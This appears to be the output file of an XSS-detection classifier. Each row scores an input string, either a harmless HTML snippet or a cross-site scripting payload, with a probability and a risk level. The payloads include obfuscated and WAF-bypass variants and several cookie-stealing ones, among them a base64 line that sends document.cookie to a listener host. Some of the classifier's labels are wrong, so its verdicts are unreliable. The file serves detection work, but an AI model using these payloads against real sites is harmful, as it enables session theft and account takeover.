Входная строка;XSS;Вероятность;Риск
"""`'><script>\x3Bjavascript:alert(1)</script>";True;91.54%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
"""><svg+onload=alert&amp;#x66""1";True;99.49%;CRITICAL
%0d%0a%20javascript:alert(1);True;95.46%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<IMG+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000039&#0000041>;True;38.07%;LOW
<img src=x onerror=print()>;True;84.02%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<span class='class-1224'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<script>alert(1)</script>.asp;True;84.83%;CRITICAL
<span class='class-844'>Services</span>;False;1.13%;SAFE
""";location=location.hash)//#0={};alert(0)";True;87.42%;CRITICAL
"""};alert(23);a={""a"":";True;94.43%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
</script><svg/onload=alert(0)>;True;99.65%;CRITICAL
"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>";True;96.95%;CRITICAL
\<script\>alert(1)\<\/script\>;True;78.67%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<img/src=x onError=""`${x}`;alert(`XSS`);"">";True;99.20%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"""><svg+onload=alert&amp;#x4D""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x0B""1";True;99.49%;CRITICAL
"&#x27;javascript:alert(2)&#x27;";True;96.32%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<button>Read more</button>;False;28.28%;LOW
<svg/onload=alert(â€œHackedâ€)>;True;99.45%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
""" accesskey='x' onclick='confirm`1`' //";True;74.55%;HIGH
<input type='text' name='field'>;False;29.42%;LOW
<ScRiPt>alert(1)</ScRiPt>;True;86.08%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
onload=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;";True;71.58%;HIGH
<h2>Login</h2>;False;27.98%;LOW
<div>Home</div>;False;25.75%;LOW
"""&amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;gt;";True;99.63%;CRITICAL
%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E;True;89.25%;CRITICAL
"XSSâ€œautofocus onclick=â€™&#97;lert()â€™";True;98.75%;CRITICAL
"xss:&#101;x&#x2F; *XSS*//*//pression(alert(""XSS""))'>";True;88.45%;CRITICAL
<p>About</p>;False;34.33%;LOW
"""><img src=javascript:while([{}]);>";True;66.91%;HIGH
"""><img src=x alt=x onerror=prompt(document.domain);>";True;98.58%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-614'>Services</span>;False;1.13%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
%E5%98%8D%E5%98%8ASet-Cookie%3A%20whoami%3Dthecyberneh%25u2028%25u2029XSS-Payload%3A%2520%3Cscript%3Ealert%281%29%3C%2Fscript%3E;True;78.04%;HIGH
"""><svg+onload=alert&amp;#x07""1";True;99.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<h4>Login</h4>;False;27.98%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
"guest/msft_a_guest_register.php?_browser=1&title=""><svg/onload=alert(1)>";True;98.97%;CRITICAL
<span class='class-814'>Services</span>;False;1.13%;SAFE
"<svg onload\r\n=$.globalEval(""al""+""ert()"");>";True;75.89%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""onmouseover=alert(1)//";True;99.13%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
"<img src=""x:%90"" title=""onerror=alert(1)//"">";True;99.63%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
"&amp;amp;lt;img/src/onerror=alert(`test`)&amp;amp;gt;";True;99.38%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme";True;91.38%;CRITICAL
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<h4>Login</h4>;False;27.98%;LOW
"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">";True;91.29%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><iframe src=""javascript:alert(XSS)"">";True;84.88%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
(A(%22onerror='alert%60123%60'test))/;True;99.57%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>";True;93.17%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<img src=x onerror=prompt()>;True;83.51%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<span class='class-1024'>Services</span>;False;1.13%;SAFE
<a href=javascript:alert(1)>click;False;13.55%;SAFE
"""><svg+onload=alert&amp;#x00""1";True;99.49%;CRITICAL
"<img/src/onerror=""window[ al+/e/['ex + ec]'e'+'rt'](2)"">";True;98.23%;CRITICAL
<span class='class-704'>Services</span>;False;1.13%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<a href=""&#X6A;avascript:alert(1)"">XSS</a>";False;3.66%;SAFE
<div>Home</div>;False;25.75%;LOW
"<audio src=""nonexistent.mp3"" onerror=""alert(1)""></audio>";True;99.82%;CRITICAL
"jaVasCript:\\\/*-\\\/*`\\\/*\\\\`\\\/*\\\'\\\/*\\\""\\\/**\\\/(\\\/* *\\\/oNcliCk=alert() )\\\/\\\/%0D%0A%0D%0A\\\/\\\/<\\\/stYle\\\/<\\\/titLe\\\/<\\\/teXtarEa\\\/<\\\/scRipt\\\/--!>\\\\x3csVg\\\/<sVg\\\/oNloAd=alert()\\\/\\\/>\\\\x3e";True;98.87%;CRITICAL
%E5%98%8D%E5%98%8A%20<script>prompt(document.domain)</script>;True;66.10%;HIGH
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E;True;86.38%;CRITICAL
[alert][0].call(this,1);True;84.13%;CRITICAL
"mrco24""type=image src onerror=""alert(1)""";True;99.41%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme   (working)-Pinaki @0xInfection(Make sure to URL encode the payload properly)";False;8.39%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x06""1";True;99.49%;CRITICAL
<span class='class-174'>Services</span>;False;1.13%;SAFE
<h4>Login</h4>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
onchange=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
"""><img src=x onerrora=confirm() onerror=confirm(1)>";True;68.29%;HIGH
{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}};True;99.25%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"'""/><img src= x onerror=prompt(/xss/)>";True;67.46%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x96""1";True;99.49%;CRITICAL
<span class='class-1344'>Services</span>;False;1.13%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<svg onload=alert(1)//;True;99.68%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<span class='class-144'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
"""><img src=x onerror=prompt(document%2Edomain);>";True;82.49%;CRITICAL
"""><img src=x onerror=prompt('document.domain');>.asp";True;80.54%;CRITICAL
"""><svg+onload=alert&amp;#x74""1";True;99.49%;CRITICAL
<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>;True;98.24%;CRITICAL
<img src=x onerror=alert(â€œfalconâ€)>;True;99.72%;CRITICAL
"<xmp><img title=""</xmp><img src onerror=alert(1)>""></xmp>";True;99.71%;CRITICAL
"(Z(""onerror=""a=console,a.log`${cookie}`""))";True;77.23%;HIGH
"""><img src=""x:x"" onerror=""alert(XSS)"">";True;99.63%;CRITICAL
"""><svg+onload=alert&amp;#x8D""1";True;99.49%;CRITICAL
<p>About</p>;False;34.33%;LOW
%script%alert(CXSSÂ¢)4/script%;True;92.45%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><svg/onload=confirm(1)>""@x.y";True;79.34%;HIGH
"""><u>XSS</u><marquee+onstart='alert(document.cookie)'>XSS";True;99.14%;CRITICAL
<wbr onfocus=alert(1) autofocus tabindex=1>;True;99.68%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>";True;67.93%;HIGH
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<script>throw[onerror]=[alert],1</script>;True;76.58%;HIGH
"<link rel=""stylesheet"" href=""#"" onload=""window.alert('XSS_WAF_BYPASS')"">";True;63.47%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<h2>Login</h2>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x23""1";True;99.49%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
"<script>var a=document.createElement(""a"");a.href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="";http://a.click();</script>";True;97.66%;CRITICAL
"<img onload=""eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))"">";True;90.99%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
<h2>Login</h2>;False;27.98%;LOW
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%27x%27onclick=%27alert(1);True;99.15%;CRITICAL
"<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> -https://portswigger.net/web-security/cross-site-scripting/cheat-sheet";True;59.07%;MEDIUM
"""><img src=a onerror=alert(document.location)>";True;98.98%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
onerror=â€alert(â€˜XSSâ€™);True;99.37%;CRITICAL
å˜¼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>;True;89.01%;CRITICAL
<span class='class-394'>Services</span>;False;1.13%;SAFE
<script src=//0-a.nl/conf.js></script>;False;14.69%;SAFE
'-alert(1)//;True;87.25%;CRITICAL
%E2%80%9C%3E%3CSvG%2Fonload%3Dalert%28document.domain%29%3E;True;80.87%;CRITICAL
"""onfocus=JaVaSCript:alert(123) autofocus";True;99.18%;CRITICAL
"%E5%98%8D%E5%98%8A%20""><img src=x onerror=prompt(document.domain);>";True;86.12%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><â€‹script>prompt()<â€‹/script>";True;58.42%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
å˜¼å˜¾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E;True;77.76%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<script>alert(1)</script>.aspx;True;84.83%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<span class='class-1244'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"&lt;img src=x onerror=alert()>";True;99.55%;CRITICAL
<span class='class-264'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<image id=x tabindex=1 onfocus=alert(1)></image>;True;99.88%;CRITICAL
javascript:\/\/\'\/<\/title><\/style><\/textarea><\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\'Audi%20RS5\'.substr(0,4)}}XXX%3Cscript%3Ealert(\'XSS\');False;31.96%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"â€alâ€;b=â€ertâ€;self[a+b]();";True;86.42%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">";False;27.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
eval(atob('YWxlcnQoKQ=='));True;83.86%;CRITICAL
<p>About</p>;False;34.33%;LOW
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE;True;75.59%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x0F""1";True;99.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x05""1";True;99.49%;CRITICAL
"<title><img title=""</title><img src onerror=alert(1)>""></title>";True;99.72%;CRITICAL
<p>About</p>;False;34.33%;LOW
"%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E";True;83.79%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x20""1";True;99.49%;CRITICAL
"<iframe src=""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""></iframe>";True;65.16%;HIGH
"<DIV STYLE=""background-image: url(&#1,javascript:alert('XSS))"">";True;84.16%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"javascript:new%20Function`al\ert\`1\``;";True;92.84%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"javascript&#x00000003A;alert&#x000000028;2&#x000000029;&#x00000003B;";True;91.51%;CRITICAL
<scr<script>ipt>alert('XSS')</scr<script>ipt>;True;92.51%;CRITICAL
"""onmouseover=""alert(1)";True;99.23%;CRITICAL
'+ '</b><script>alert(document.cookie)</script><b><!--';True;84.28%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<script>location='javascript:alert\x281\x29'</script>;True;86.39%;CRITICAL
"""><svg+onload=alert&amp;#x86""1";True;99.49%;CRITICAL
<head id=x tabindex=1 onfocus=alert(1) style=display:block></head>;True;99.85%;CRITICAL
"{{&lt;svg/onload=prompt(&quot;XSS&quot;)&gt; }}";True;70.74%;HIGH
<div>Home</div>;False;25.75%;LOW
<script>'confirm(0)%3B<%2Fscript>;True;46.42%;MEDIUM
<span class='class-494'>Services</span>;False;1.13%;SAFE
(alert)();True;79.23%;HIGH
"<a @['c\lic\u{6b}']=""_c.constructor('alert(1)')()"">test</a>";False;2.84%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src=x onerror=URL='javascript:confirm(1)'>;True;88.01%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<svg onload=alert&#0000000040document.cookie)>;True;99.56%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<script>onerror=alert;throw 1337</script>";True;99.46%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
[1].find(alert);True;82.62%;CRITICAL
"javascript://'/</title></style></textarea></script>--><p"" %0D %0A onclick=alert(123)//>*/alert()/*";True;99.10%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"xyz';""/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>";True;92.92%;CRITICAL
"%uff1cscript%uff1ealert(â€˜XSSâ€™);%uff1c/script%uff1e";True;91.00%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""{text:<img/src=x onload=confirm(1)>}""";True;86.01%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<span class='class-554'>Services</span>;False;1.13%;SAFE
amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik=;True;41.39%;MEDIUM
<span class='class-574'>Services</span>;False;1.13%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<img src onerror /"" '""= alt=javascript:alert(1)//"">";True;89.57%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<svg onload=alert(document.domain)>;True;99.59%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
"'""/><img src= x onerror='alert(document.domain)'>";True;98.24%;CRITICAL
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x7E""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img+src%3dOnXSS+OnError%3dalert('XSs-Cloudflare-bypass-By-Dedi')>;True;42.93%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
"<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>";True;94.64%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<script>alert(document[â€˜cookieâ€™])</script>;True;76.66%;HIGH
<div>Home</div>;False;25.75%;LOW
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
search?q=javascript:alert(document.domain);True;95.68%;CRITICAL
"<iframe/src=""data:text/html,<svg onload=alert(1)>"">";True;99.81%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
javascript://%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B%27%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('XSS');True;63.17%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"_0x68087f:alert(0x1);";True;87.24%;CRITICAL
<html ontouchend=alert(1)>;True;99.68%;CRITICAL
"""><svg+onload=alert&amp;#x24""1";True;99.49%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"â€œ><script>alert(1);</script>";True;89.65%;CRITICAL
"""><svg+onload=alert&amp;#x4A""1";True;99.49%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<span class='class-904'>Services</span>;False;1.13%;SAFE
"javascript://'//"" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*";True;99.13%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"%3F%20""><img src=q onerror=alert(1)>";True;99.71%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
å˜¼img src=1 onerror=alert(1)å˜¾;True;99.67%;CRITICAL
<body onpageshow=alert(1)>;True;99.64%;CRITICAL
"""><svg+onload=alert&amp;#x61""1";True;99.49%;CRITICAL
<!--[if<img src=x onerror=javascript:alert(1)//]>-->;True;99.43%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
"<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>";True;99.38%;CRITICAL
"""<svg onload=alert (1)> "" ;";True;99.32%;CRITICAL
"""><svg+onload=alert&amp;#x99""1";True;99.49%;CRITICAL
"""+onDblClick=prompt(123)""+";True;74.94%;HIGH
